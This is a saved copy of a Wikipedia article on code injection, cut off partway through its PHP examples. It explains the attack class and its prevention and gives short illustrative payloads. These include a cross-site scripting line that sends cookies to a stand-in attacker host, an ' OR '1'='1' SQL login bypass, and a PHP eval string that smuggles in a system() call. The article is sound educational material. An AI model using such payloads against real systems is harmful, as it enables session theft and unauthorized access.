<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<meta http-equiv="Content-Style-Type" content="text/css" />
		<meta name="generator" content="MediaWiki 1.15alpha" />
		<meta name="keywords" content="Code injection,Articles needing additional references from November 2008,Active Server Pages,Buffer overflow,Buffer overrun,Command line,Computer bug,Computer hacking,Computer worm,Cross-site scripting,Debugging" />
		<link rel="alternate" type="application/x-wiki" title="Edit this page" href="/w/index.php?title=Code_injection&amp;action=edit" />
		<link rel="edit" title="Edit this page" href="/w/index.php?title=Code_injection&amp;action=edit" />
		<link rel="apple-touch-icon" href="http://en.wikipedia.org/apple-touch-icon.png" />
		<link rel="shortcut icon" href="/favicon.ico" />
		<link rel="search" type="application/opensearchdescription+xml" href="/w/opensearch_desc.php" title="Wikipedia (en)" />
		<link rel="copyright" href="http://www.gnu.org/copyleft/fdl.html" />
		<link rel="alternate" type="application/rss+xml" title="Wikipedia RSS Feed" href="/w/index.php?title=Special:RecentChanges&amp;feed=rss" />
		<link rel="alternate" type="application/atom+xml" title="Wikipedia Atom Feed" href="/w/index.php?title=Special:RecentChanges&amp;feed=atom" />
		<title>Code injection - Wikipedia, the free encyclopedia</title>
		<link rel="stylesheet" href="/skins-1.5/common/shared.css?207xx" type="text/css" media="screen" />
		<link rel="stylesheet" href="/skins-1.5/common/commonPrint.css?207xx" type="text/css" media="print" />
		<link rel="stylesheet" href="/skins-1.5/monobook/main.css?207xx" type="text/css" media="screen" />
		<link rel="stylesheet" href="/skins-1.5/chick/main.css?207xx" type="text/css" media="handheld" />
		<!--[if lt IE 5.5000]><link rel="stylesheet" href="/skins-1.5/monobook/IE50Fixes.css?207xx" type="text/css" media="screen" /><![endif]-->
		<!--[if IE 5.5000]><link rel="stylesheet" href="/skins-1.5/monobook/IE55Fixes.css?207xx" type="text/css" media="screen" /><![endif]-->
		<!--[if IE 6]><link rel="stylesheet" href="/skins-1.5/monobook/IE60Fixes.css?207xx" type="text/css" media="screen" /><![endif]-->
		<!--[if IE 7]><link rel="stylesheet" href="/skins-1.5/monobook/IE70Fixes.css?207xx" type="text/css" media="screen" /><![endif]-->
		<link rel="stylesheet" href="/w/index.php?title=MediaWiki:Common.css&amp;usemsgcache=yes&amp;ctype=text%2Fcss&amp;smaxage=2678400&amp;action=raw&amp;maxage=2678400" type="text/css" />
		<link rel="stylesheet" href="/w/index.php?title=MediaWiki:Print.css&amp;usemsgcache=yes&amp;ctype=text%2Fcss&amp;smaxage=2678400&amp;action=raw&amp;maxage=2678400" type="text/css" media="print" />
		<link rel="stylesheet" href="/w/index.php?title=MediaWiki:Handheld.css&amp;usemsgcache=yes&amp;ctype=text%2Fcss&amp;smaxage=2678400&amp;action=raw&amp;maxage=2678400" type="text/css" media="handheld" />
		<link rel="stylesheet" href="/w/index.php?title=MediaWiki:Monobook.css&amp;usemsgcache=yes&amp;ctype=text%2Fcss&amp;smaxage=2678400&amp;action=raw&amp;maxage=2678400" type="text/css" />
		<link rel="stylesheet" href="/w/index.php?title=-&amp;action=raw&amp;maxage=2678400&amp;gen=css" type="text/css" />
		<!--[if lt IE 7]><script type="text/javascript" src="/skins-1.5/common/IEFixes.js?207xx"></script>
		<meta http-equiv="imagetoolbar" content="no" /><![endif]-->

		<script type= "text/javascript">/*<![CDATA[*/
		var skin = "monobook";
		var stylepath = "/skins-1.5";
		var wgArticlePath = "/wiki/$1";
		var wgScriptPath = "/w";
		var wgScript = "/w/index.php";
		var wgVariantArticlePath = false;
		var wgActionPaths = {};
		var wgServer = "http://en.wikipedia.org";
		var wgCanonicalNamespace = "";
		var wgCanonicalSpecialPageName = false;
		var wgNamespaceNumber = 0;
		var wgPageName = "Code_injection";
		var wgTitle = "Code injection";
		var wgAction = "view";
		var wgArticleId = "1065470";
		var wgIsArticle = true;
		var wgUserName = null;
		var wgUserGroups = null;
		var wgUserLanguage = "en";
		var wgContentLanguage = "en";
		var wgBreakFrames = false;
		var wgCurRevisionId = 281618120;
		var wgVersion = "1.15alpha";
		var wgEnableAPI = true;
		var wgEnableWriteAPI = true;
		var wgSeparatorTransformTable = ["", ""];
		var wgDigitTransformTable = ["", ""];
		var wgMWSuggestTemplate = "http://en.wikipedia.org/w/api.php?action=opensearch\x26search={searchTerms}\x26namespace={namespaces}\x26suggest";
		var wgDBname = "enwiki";
		var wgSearchNamespaces = [0];
		var wgMWSuggestMessages = ["with suggestions", "no suggestions"];
		var wgRestrictionEdit = [];
		var wgRestrictionMove = [];
		/*]]>*/</script>

		<script type="text/javascript" src="/skins-1.5/common/wikibits.js?207xx"><!-- wikibits js --></script>
		<!-- Head Scripts -->
		<script type="text/javascript" src="/skins-1.5/common/ajax.js?207xx"></script>
		<script type="text/javascript" src="/skins-1.5/common/mwsuggest.js?207xx"></script>
<script type="text/javascript">/*<![CDATA[*/
var wgNotice='';var wgNoticeLocal='';
/*]]>*/</script>		<script type="text/javascript" src="http://upload.wikimedia.org/centralnotice/wikipedia/en/centralnotice.js?207xx"></script>
<style type="text/css">/*<![CDATA[*/
.source-sql {line-height: normal;}
.source-sql li, .source-sql pre {
	line-height: normal; border: 0px none white;
}
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for sql
 * CSS class: source-sql, CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie (http://qbnz.com/highlighter)
 */
.source-sql .de1, .source-sql .de2 {font-family: 'Courier New', Courier, monospace; font-weight: normal;}
.source-sql  {}
.source-sql .head {}
.source-sql .foot {}
.source-sql .imp {font-weight: bold; color: red;}
.source-sql .ln-xtra {color: #cc0; background-color: #ffc;}
.source-sql li {font-family: 'Courier New', Courier, monospace; color: black; font-weight: normal; font-style: normal;}
.source-sql li.li2 {font-weight: bold;}
.source-sql .kw1 {color: #993333; font-weight: bold;}
.source-sql .co1 {color: #808080; font-style: italic;}
.source-sql .co2 {color: #808080; font-style: italic;}
.source-sql .coMULTI {color: #808080; font-style: italic;}
.source-sql .es0 {color: #000099; font-weight: bold;}
.source-sql .br0 {color: #66cc66;}
.source-sql .st0 {color: #ff0000;}
.source-sql .nu0 {color: #cc66cc;}

/*]]>*/
</style>
<style type="text/css">/*<![CDATA[*/
@import "/w/index.php?title=MediaWiki:Geshi.css&usemsgcache=yes&action=raw&ctype=text/css&smaxage=2678400";
/*]]>*/
</style><style type="text/css">/*<![CDATA[*/
.source-php {line-height: normal;}
.source-php li, .source-php pre {
	line-height: normal; border: 0px none white;
}
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for php
 * CSS class: source-php, CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie (http://qbnz.com/highlighter)
 */
.source-php .de1, .source-php .de2 {font-family: 'Courier New', Courier, monospace; font-weight: normal;}
.source-php  {}
.source-php .head {}
.source-php .foot {}
.source-php .imp {font-weight: bold; color: red;}
.source-php .ln-xtra {color: #cc0; background-color: #ffc;}
.source-php li {font-family: 'Courier New', Courier, monospace; color: black; font-weight: normal; font-style: normal;}
.source-php li.li2 {font-weight: bold;}
.source-php .kw1 {color: #b1b100;}
.source-php .kw2 {color: #000000; font-weight: bold;}
.source-php .kw3 {color: #000066;}
.source-php .co1 {color: #808080; font-style: italic;}
.source-php .co2 {color: #808080; font-style: italic;}
.source-php .coMULTI {color: #808080; font-style: italic;}
.source-php .es0 {color: #000099; font-weight: bold;}
.source-php .br0 {color: #66cc66;}
.source-php .st0 {color: #ff0000;}
.source-php .nu0 {color: #cc66cc;}
.source-php .me1 {color: #006600;}
.source-php .me2 {color: #006600;}
.source-php .sc0 {}
.source-php .sc1 {}
.source-php .sc2 {}
.source-php .sc3 {}
.source-php .re0 {color: #0000ff;}
.source-php .re1 {color: #ff0000}

/*]]>*/
</style>
<style type="text/css">/*<![CDATA[*/
@import "/w/index.php?title=MediaWiki:Geshi.css&usemsgcache=yes&action=raw&ctype=text/css&smaxage=2678400";
/*]]>*/
</style><style type="text/css">/*<![CDATA[*/
.source-xml {line-height: normal;}
.source-xml li, .source-xml pre {
	line-height: normal; border: 0px none white;
}
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for xml
 * CSS class: source-xml, CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie (http://qbnz.com/highlighter)
 */
.source-xml .de1, .source-xml .de2 {font-family: 'Courier New', Courier, monospace; font-weight: normal;}
.source-xml  {}
.source-xml .head {}
.source-xml .foot {}
.source-xml .imp {font-weight: bold; color: red;}
.source-xml .ln-xtra {color: #cc0; background-color: #ffc;}
.source-xml li {font-family: 'Courier New', Courier, monospace; color: black; font-weight: normal; font-style: normal;}
.source-xml li.li2 {font-weight: bold;}
.source-xml .coMULTI {color: #808080; font-style: italic;}
.source-xml .es0 {color: #000099; font-weight: bold;}
.source-xml .br0 {color: #66cc66;}
.source-xml .st0 {color: #ff0000;}
.source-xml .nu0 {color: #cc66cc;}
.source-xml .sc0 {color: #00bbdd;}
.source-xml .sc1 {color: #ddbb00;}
.source-xml .sc2 {color: #339933;}
.source-xml .sc3 {color: #009900;}
.source-xml .re0 {color: #000066;}
.source-xml .re1 {font-weight: bold; color: black;}
.source-xml .re2 {font-weight: bold; color: black;}

/*]]>*/
</style>
<style type="text/css">/*<![CDATA[*/
@import "/w/index.php?title=MediaWiki:Geshi.css&usemsgcache=yes&action=raw&ctype=text/css&smaxage=2678400";
/*]]>*/
</style><style type="text/css">/*<![CDATA[*/
.source-asp {line-height: normal;}
.source-asp li, .source-asp pre {
	line-height: normal; border: 0px none white;
}
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for asp
 * CSS class: source-asp, CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie (http://qbnz.com/highlighter)
 */
.source-asp .de1, .source-asp .de2 {font-family: 'Courier New', Courier, monospace; font-weight: normal;}
.source-asp  {}
.source-asp .head {}
.source-asp .foot {}
.source-asp .imp {font-weight: bold; color: red;}
.source-asp .ln-xtra {color: #cc0; background-color: #ffc;}
.source-asp li {font-family: 'Courier New', Courier, monospace; color: black; font-weight: normal; font-style: normal;}
.source-asp li.li2 {font-weight: bold;}
.source-asp .kw1 {color: #990099; font-weight: bold;}
.source-asp .kw2 {color: #0000ff; font-weight: bold;}
.source-asp .kw3 {color: #330066;}
.source-asp .co1 {color: #008000;}
.source-asp .co2 {color: #ff6600;}
.source-asp .coMULTI {color: #008000;}
.source-asp .es0 {color: #000099; font-weight: bold;}
.source-asp .br0 {color: #006600; font-weight: bold}
.source-asp .st0 {color: #cc0000;}
.source-asp .nu0 {color: #800000;}
.source-asp .me1 {color: #9900cc;}
.source-asp .sc0 {}
.source-asp .sc1 {}
.source-asp .sc2 {}

/*]]>*/
</style>
<style type="text/css">/*<![CDATA[*/
@import "/w/index.php?title=MediaWiki:Geshi.css&usemsgcache=yes&action=raw&ctype=text/css&smaxage=2678400";
/*]]>*/
</style>		<script type="text/javascript" src="/w/index.php?title=-&amp;action=raw&amp;gen=js&amp;useskin=monobook"><!-- site js --></script>
	</head>
<body class="mediawiki ltr ns-0 ns-subject page-Code_injection skin-monobook">
	<div id="globalWrapper">
		<div id="column-content">
	<div id="content">
		<a name="top" id="top"></a>
		<div id="siteNotice"><script type='text/javascript'>if (wgNotice != '') document.writeln(wgNotice);</script></div>		<h1 id="firstHeading" class="firstHeading">Code injection</h1>
		<div id="bodyContent">
			<h3 id="siteSub">From Wikipedia, the free encyclopedia</h3>
			<div id="contentSub"></div>
									<div id="jump-to-nav">Jump to: <a href="#column-one">navigation</a>, <a href="#searchInput">search</a></div>			<!-- start content -->
			<table class="metadata plainlinks ambox ambox-content" style="">
<tr>
<td class="mbox-image">
<div style="width: 52px;"><a href="/wiki/File:Question_book-new.svg" class="image" title="Question book-new.svg"><img alt="" src="http://upload.wikimedia.org/wikipedia/en/thumb/9/99/Question_book-new.svg/50px-Question_book-new.svg.png" width="50" height="39" border="0" /></a></div>
</td>
<td class="mbox-text" style="">This article <b>needs additional <a href="/wiki/Wikipedia:Citing_sources" title="Wikipedia:Citing sources">citations</a> for <a href="/wiki/Wikipedia:Verifiability" title="Wikipedia:Verifiability">verification</a>.</b> Please help <a href="http://en.wikipedia.org/w/index.php?title=Code_injection&amp;action=edit" class="external text" title="http://en.wikipedia.org/w/index.php?title=Code_injection&amp;action=edit" rel="nofollow">improve this article</a> by adding <a href="/wiki/Wikipedia:Reliable_sources" title="Wikipedia:Reliable sources">reliable references</a> (ideally, using <i><a href="/wiki/Wikipedia:Footnotes" title="Wikipedia:Footnotes">inline citations</a></i>). Unsourced material may be <a href="/wiki/Template:Fact" title="Template:Fact">challenged</a> and <a href="/wiki/Wikipedia:BURDEN" title="Wikipedia:BURDEN" class="mw-redirect">removed</a>. <small><i>(November 2008)</i></small></td>
</tr>
</table>
<p><b>Code injection</b> is the exploitation of a <a href="/wiki/Computer_bug" title="Computer bug" class="mw-redirect">computer bug</a> that is caused by processing invalid data. Code injection can be used by an attacker to introduce (or "inject") code into a computer program to change the course of execution. The results of a Code Injection attack can be disastrous. For instance, code injection is used by some <a href="/wiki/Computer_worm" title="Computer worm">Computer worms</a> to propagate.</p>
<table id="toc" class="toc" summary="Contents">
<tr>
<td>
<div id="toctitle">
<h2>Contents</h2>
</div>
<ul>
<li class="toclevel-1"><a href="#Overview_and_example"><span class="tocnumber">1</span> <span class="toctext">Overview and example</span></a></li>
<li class="toclevel-1"><a href="#Uses_of_Code_Injection"><span class="tocnumber">2</span> <span class="toctext">Uses of Code Injection</span></a>
<ul>
<li class="toclevel-2"><a href="#Intentional_Use"><span class="tocnumber">2.1</span> <span class="toctext">Intentional Use</span></a>
<ul>
<li class="toclevel-3"><a href="#Malevolent"><span class="tocnumber">2.1.1</span> <span class="toctext">Malevolent</span></a></li>
<li class="toclevel-3"><a href="#Benevolent"><span class="tocnumber">2.1.2</span> <span class="toctext">Benevolent</span></a></li>
</ul>
</li>
<li class="toclevel-2"><a href="#Unintentional_Use"><span class="tocnumber">2.2</span> <span class="toctext">Unintentional Use</span></a></li>
</ul>
</li>
<li class="toclevel-1"><a href="#Preventing_Code_Injection"><span class="tocnumber">3</span> <span class="toctext">Preventing Code Injection</span></a></li>
<li class="toclevel-1"><a href="#Examples_of_Code_Injection"><span class="tocnumber">4</span> <span class="toctext">Examples of Code Injection</span></a>
<ul>
<li class="toclevel-2"><a href="#SQL_Injection"><span class="tocnumber">4.1</span> <span class="toctext">SQL Injection</span></a></li>
<li class="toclevel-2"><a href="#PHP_Injection"><span class="tocnumber">4.2</span> <span class="toctext">PHP Injection</span></a></li>
<li class="toclevel-2"><a href="#Dynamic_Evaluation_Vulnerabilities"><span class="tocnumber">4.3</span> <span class="toctext">Dynamic Evaluation Vulnerabilities</span></a>
<ul>
<li class="toclevel-3"><a href="#Dynamic_Evaluation_Vulnerabilities_-_Eval_Injection"><span class="tocnumber">4.3.1</span> <span class="toctext">Dynamic Evaluation Vulnerabilities - Eval Injection</span></a></li>
<li class="toclevel-3"><a href="#Dynamic_Evaluation_Vulnerabilities_-_Dynamic_Variable_Evaluation"><span class="tocnumber">4.3.2</span> <span class="toctext">Dynamic Evaluation Vulnerabilities - Dynamic Variable Evaluation</span></a></li>
<li class="toclevel-3"><a href="#Dynamic_Evaluation_Vulnerabilities_-_Dynamic_Function_Evaluation"><span class="tocnumber">4.3.3</span> <span class="toctext">Dynamic Evaluation Vulnerabilities - Dynamic Function Evaluation</span></a></li>
</ul>
</li>
<li class="toclevel-2"><a href="#Include_File_Injection"><span class="tocnumber">4.4</span> <span class="toctext">Include File Injection</span></a></li>
<li class="toclevel-2"><a href="#Shell_Injection"><span class="tocnumber">4.5</span> <span class="toctext">Shell Injection</span></a></li>
<li class="toclevel-2"><a href="#HTML.2FScript_injection_.28cross-site_scripting.29"><span class="tocnumber">4.6</span> <span class="toctext">HTML/Script injection (cross-site scripting)</span></a>
<ul>
<li class="toclevel-3"><a href="#HTML_injection_in_IE7_via_infected_DLL"><span class="tocnumber">4.6.1</span> <span class="toctext">HTML injection in IE7 via infected DLL</span></a></li>
</ul>
</li>
<li class="toclevel-2"><a href="#ASP_Injection"><span class="tocnumber">4.7</span> <span class="toctext">ASP Injection</span></a></li>
<li class="toclevel-2"><a href="#Analogy"><span class="tocnumber">4.8</span> <span class="toctext">Analogy</span></a></li>
</ul>
</li>
<li class="toclevel-1"><a href="#See_also"><span class="tocnumber">5</span> <span class="toctext">See also</span></a></li>
<li class="toclevel-1"><a href="#References"><span class="tocnumber">6</span> <span class="toctext">References</span></a></li>
<li class="toclevel-1"><a href="#External_links"><span class="tocnumber">7</span> <span class="toctext">External links</span></a>
<ul>
<li class="toclevel-2"><a href="#Notable_code_injection_programs"><span class="tocnumber">7.1</span> <span class="toctext">Notable code injection programs</span></a></li>
</ul>
</li>
</ul>
</td>
</tr>
</table>
<script type="text/javascript">
//<![CDATA[
 if (window.showTocToggle) { var tocShowText = "show"; var tocHideText = "hide"; showTocToggle(); } 
//]]>
</script>
<p><a name="Overview_and_example" id="Overview_and_example"></a></p>
<h2><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=1" title="Edit section: Overview and example">edit</a>]</span> <span class="mw-headline">Overview and example</span></h2>
<p>A web server has a "Guest book" script, which accepts small messages from users, and typically receives messages such as</p>
<pre>
 Very Nice site!
</pre>
<p>However a malicious person may know of a code injection vulnerability in the "Guest book", and enters a message such as</p>
<pre>
 Nice Site,  I think I'll take it.&gt;&lt;script&gt;document.location='http://some_attacker/cookie.cgi?' +document.cookie&lt;/script&gt;
</pre>
<p>If another user views the page then the injected code will be executed. This code can allow the attacker to impersonate another user. However this same software bug can be accidentally triggered by an unassuming user which will cause the website to display bad HTML code.</p>
<pre>
 That post was awesome, :&gt;) 
</pre>
<p>In this case the <a href="/wiki/Emoticon" title="Emoticon">emoticon</a> would cause the HTML to be malformed because a malformed <a href="/wiki/HTML" title="HTML">HTML</a> tag was injected into the code.</p>
<p>Most of these problems are related to erroneous assumptions of what input data is possible, or the effects of special data.<sup id="cite_ref-HopeWalther_0-0" class="reference"><a href="#cite_note-HopeWalther-0" title=""><span>[</span>1<span>]</span></a></sup> Classic examples of dangerous assumptions a software developer might make about the input to a program include:</p>
<ul>
<li>assuming that <a href="/wiki/Metacharacter" title="Metacharacter">metacharacters</a> for an API never occurs in an input; e.g. assuming punctuation like quotation marks or semi-colons would never appear</li>
<li>assuming only numeric characters will be entered as input</li>
<li>assuming the input will never exceed a certain size</li>
<li>assuming that numeric values are equal or less than upper bound</li>
<li>assuming that numeric values are equal or greater than lower bound</li>
<li>assuming that client supplied values set by server (such as hidden <a href="/wiki/Form_(web)" title="Form (web)">form</a> fields or <a href="/wiki/HTTP_Cookie" title="HTTP Cookie" class="mw-redirect">cookies</a>), cannot be modified by client. This assumption ignores known attacks such as <a href="/wiki/HTTP_Cookie" title="HTTP Cookie" class="mw-redirect">Cookie</a> poisoning, in which values are set arbitrarily by malicious clients.</li>
<li>assuming that it is okay to pick pointers or array indexes from input</li>
<li>assuming an input would never provide false information about itself or related values, such as the size of a file<sup id="cite_ref-1" class="reference"><a href="#cite_note-1" title=""><span>[</span>2<span>]</span></a></sup></li>
</ul>
<p><a name="Uses_of_Code_Injection" id="Uses_of_Code_Injection"></a></p>
<h2><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=2" title="Edit section: Uses of Code Injection">edit</a>]</span> <span class="mw-headline">Uses of Code Injection</span></h2>
<p><a name="Intentional_Use" id="Intentional_Use"></a></p>
<h3><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=3" title="Edit section: Intentional Use">edit</a>]</span> <span class="mw-headline">Intentional Use</span></h3>
<p><a name="Malevolent" id="Malevolent"></a></p>
<h4><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=4" title="Edit section: Malevolent">edit</a>]</span> <span class="mw-headline">Malevolent</span></h4>
<p>Use of code injection is typically viewed as a malevolent action, and it often is. Code injection techniques are popular in system <a href="/wiki/Computer_hacking" title="Computer hacking" class="mw-redirect">hacking</a> or <a href="/wiki/Security_cracking" title="Security cracking" class="mw-redirect">cracking</a> to gain information, <a href="/wiki/Privilege_escalation" title="Privilege escalation">Privilege escalation</a> or unauthorised access to a system.</p>
<p>Code injection can be used malevolently to:</p>
<ul>
<li>Arbitrarily modify values in a database through a type of code injection called <a href="/wiki/SQL_injection" title="SQL injection">SQL injection</a>. The impact of this can range from <a href="/wiki/Defacement_(vandalism)" title="Defacement (vandalism)">defacement</a> of a web site to serious compromisation of sensitive data.</li>
<li>Install <a href="/wiki/Malware" title="Malware">malware</a> on a computer by exploiting code injection vulnerabilities in a web browser or its plugins when the user visits a malicious site.</li>
<li>Install <a href="/wiki/Malware" title="Malware">malware</a> or execute malevolent code on a server, by <b>PHP</b> or <b>ASP Injection</b>.</li>
<li><a href="/wiki/Privilege_escalation" title="Privilege escalation">Privilege escalation</a> to <a href="/wiki/Superuser" title="Superuser">root</a> permissions by exploiting <b>Shell Injection</b> vulnerabilities in a <a href="/wiki/Setuid" title="Setuid">setuid root</a> binary on UNIX.</li>
<li><a href="/wiki/Privilege_escalation" title="Privilege escalation">Privilege escalation</a> to <a href="/wiki/Superuser" title="Superuser">Local System</a> permissions by exploiting <b>Shell Injection</b> vulnerabilities in a service on Windows.</li>
<li>Stealing sessions/cookies from web browsers using <b>HTML/Script Injection</b> (<a href="/wiki/Cross-site_scripting" title="Cross-site scripting">Cross-site scripting</a>).</li>
</ul>
<p><a name="Benevolent" id="Benevolent"></a></p>
<h4><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=5" title="Edit section: Benevolent">edit</a>]</span> <span class="mw-headline">Benevolent</span></h4>
<p>Some people may use code injections with good intentions. For example, changing or tweaking the behavior of a program or system through code injection can "trick" the system into behaving in a certain way without any malicious intent. For example:</p>
<ul>
<li>Code injection could introduce a useful new column that did not appear in the original design of a search results page.</li>
<li>By using a field not exposed in the default functions of the original design, a code injection could offer a new way to filter, order, or group data.</li>
</ul>
<p>Someone might resort to this sort of work-around for one of these reasons:</p>
<ul>
<li>Other ways of modifying the software to function as desired prove impossible, or</li>
<li>Other ways of modifying the software are prohibitively costly, or</li>
<li>Other ways of modifying the software become too frustrating or painful.</li>
</ul>
<p>The development community as a whole frowns on code injection for this purpose, calling it a kludge or <a href="/wiki/Hack_(technology_slang)" title="Hack (technology slang)" class="mw-redirect">hack</a>.</p>
<p>Some developers allow or even promote the use of code injection to "enhance" their software, usually because this solution offers a less expensive way to implement new or specialized features. Unfortunately, the side effects and unaccounted implications can be very dangerous.</p>
<p>In general, even well-intentioned use of code injection is discouraged.</p>
<p><a name="Unintentional_Use" id="Unintentional_Use"></a></p>
<h3><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=6" title="Edit section: Unintentional Use">edit</a>]</span> <span class="mw-headline">Unintentional Use</span></h3>
<p>Some users may unsuspectingly perform code injection because input they provide to a program was not considered by those who originally developed the system. For example:</p>
<ul>
<li>What the user may consider a valid input may contain token characters or character strings that have been reserved by the developer to have special meaning (perhaps the "&amp;" in "Shannon &amp; Jason", or quotation marks as in "Bub 'Slugger' McCracken").</li>
<li>The user may submit a malformed file as input that is handled gracefully in one application, but is toxic to the receiving system.</li>
</ul>
<p><a name="Preventing_Code_Injection" id="Preventing_Code_Injection"></a></p>
<h2><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=7" title="Edit section: Preventing Code Injection">edit</a>]</span> <span class="mw-headline">Preventing Code Injection</span></h2>
<p>To prevent Code Injection problems, utilize <a href="/wiki/Secure_input_and_output_handling" title="Secure input and output handling">Secure input and output handling</a>, such as:</p>
<ul>
<li>Input validation</li>
<li>Escaping dangerous characters. For instance, in PHP, using the <code>htmlentities()</code> function to protect general inputs into your web application, and <code>mysql_real_escape_string()</code> to protect inputs which will be included in a SQL request, to protect against SQL Injection.</li>
<li>Input encoding</li>
<li>Output encoding</li>
<li>Other coding practices which are not prone to Code Injection vulnerabilities, such as "parameterized SQL queries" (also known as "prepared statements" and sometimes "bind variables").</li>
</ul>
<p><a name="Examples_of_Code_Injection" id="Examples_of_Code_Injection"></a></p>
<h2><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=8" title="Edit section: Examples of Code Injection">edit</a>]</span> <span class="mw-headline">Examples of Code Injection</span></h2>
<p><a name="SQL_Injection" id="SQL_Injection"></a></p>
<h3><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=9" title="Edit section: SQL Injection">edit</a>]</span> <span class="mw-headline">SQL Injection</span></h3>
<p><a href="/wiki/SQL_injection" title="SQL injection">SQL injection</a> takes advantage of the syntax of SQL to inject commands that can read or modify a database, or compromise the meaning of the original query.</p>
<p>For example, consider a web page has two fields to allow users to enter a user name and a password. The code behind the page will generate a <a href="/wiki/SQL" title="SQL">SQL</a> query to check the password against the list of user names:</p>
<div dir="ltr" style="text-align: left;">
<pre class="source-sql">
<span class="kw1">SELECT</span> UserList.Username
<span class="kw1">FROM</span> UserList
<span class="kw1">WHERE</span> UserList.Username = <span class="st0">'Username'</span>
<span class="kw1">AND</span> UserList.Password = <span class="st0">'Password'</span>
</pre></div>
<p>If this query returns any rows, then access is granted. However, if the malicious user enters a valid Username and injects some valid code (<code>"password' OR '1'='1"</code>) in the Password field, then the resulting query will look like this:</p>
<div dir="ltr" style="text-align: left;">
<pre class="source-sql">
<span class="kw1">SELECT</span> UserList.Username
<span class="kw1">FROM</span> UserList
<span class="kw1">WHERE</span> UserList.Username = <span class="st0">'Username'</span>
<span class="kw1">AND</span> UserList.Password = <span class="st0">'password'</span> <span class="kw1">OR</span> <span class="st0">'1'</span>=<span class="st0">'1'</span>
</pre></div>
<p>In the example above, "Password" is assumed to be blank or some innocuous string. "<code>'1'='1'</code>" will always be true and many rows will be returned, thereby allowing access.</p>
<p>The technique may be refined to allow multiple statements to run, or even to load up and run external programs.</p>
<p><a name="PHP_Injection" id="PHP_Injection"></a></p>
<h3><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=10" title="Edit section: PHP Injection">edit</a>]</span> <span class="mw-headline">PHP Injection</span></h3>
<p>"PHP Injection," "ASP Injection," <i>et cetera</i> are terms coined which refer to various types of code injection attacks which allow an attacker to supply code to the server side scripting engine. In the case of "PHP Injection," the server side scripting engine is <a href="/wiki/PHP" title="PHP">PHP</a>.</p>
<p>In practice, PHP Injection is either the exploitation of "Dynamic Evaluation Vulnerabilities," "Include File Injection," or similar code injection vulnerabilities.</p>
<p><a name="Dynamic_Evaluation_Vulnerabilities" id="Dynamic_Evaluation_Vulnerabilities"></a></p>
<h3><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=11" title="Edit section: Dynamic Evaluation Vulnerabilities">edit</a>]</span> <span class="mw-headline">Dynamic Evaluation Vulnerabilities</span></h3>
<p>Steven M. Christey of <a href="http://www.mitre.org" class="external text" title="http://www.mitre.org" rel="nofollow">mitre.org</a> suggests this name for a class of code injection vulnerabilities.</p>
<p><a name="Dynamic_Evaluation_Vulnerabilities_-_Eval_Injection" id="Dynamic_Evaluation_Vulnerabilities_-_Eval_Injection"></a></p>
<h4><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=12" title="Edit section: Dynamic Evaluation Vulnerabilities - Eval Injection">edit</a>]</span> <span class="mw-headline">Dynamic Evaluation Vulnerabilities - Eval Injection</span></h4>
<p>An eval injection vulnerability occurs when an attacker can control all or part of an input string that is fed into an <code><a href="/wiki/Eval" title="Eval">eval</a>()</code> function call.<sup id="cite_ref-2" class="reference"><a href="#cite_note-2" title=""><span>[</span>3<span>]</span></a></sup></p>
<div dir="ltr" style="text-align: left;">
<pre class="source-php">
<span class="re0">$myvar</span> = <span class="st0">'somevalue'</span>; 
<span class="re0">$x</span> = <span class="re0">$_GET</span><span class="br0">[</span><span class="st0">'arg'</span><span class="br0">]</span>; 
<span class="kw3">eval</span><span class="br0">(</span><span class="st0">'$myvar = '</span> . <span class="re0">$x</span> . <span class="st0">';'</span><span class="br0">)</span>;
</pre></div>
<p>The argument of "<code>eval</code>" will be processed as PHP, so additional commands can be appended. For example, if "arg" is set to "<code>10; system('/bin/echo uh-oh')</code>", additional code is run which executes a program on the server, in this case "<code>/bin/echo</code>".</p>
<p><a name="Dynamic_Evaluation_Vulnerabilities_-_Dynamic_Variable_Evaluation" id="Dynamic_Evaluation_Vulnerabilities_-_Dynamic_Variable_Evaluation"></a></p>
<h4><span class="editsection">[<a href="/w/index.php?title=Code_injection&amp;action=edit&amp;section=13" title="Edit section: Dynamic Evaluation Vulnerabilities - Dynamic Variable Evaluation">edit</a>]</span> <span class="mw-headline">Dynamic Evaluation Vulnerabilities - Dynamic Variable Evaluation</span></h4>
<p>As defined in <a href="http://seclists.org/lists/fulldisclosure/2006/May/0035.html" class="external text" title="http://seclists.org/lists/fulldisclosure/2006/May/0035.html" rel="nofollow">"Dynamic Evaluation Vulnerabilities in PHP applications"</a>: PHP supports "variable variables," which are variables or expressions that evaluate to the names of other variables. They can be used to dynamically change which variable is accessed or set during execution of the program. This powerful and convenient feature is also dangerous.</p>
<p>A number of applications have code such as the following:</p>
<div dir="ltr" style="text-align: left;">
<pre class="source-php">
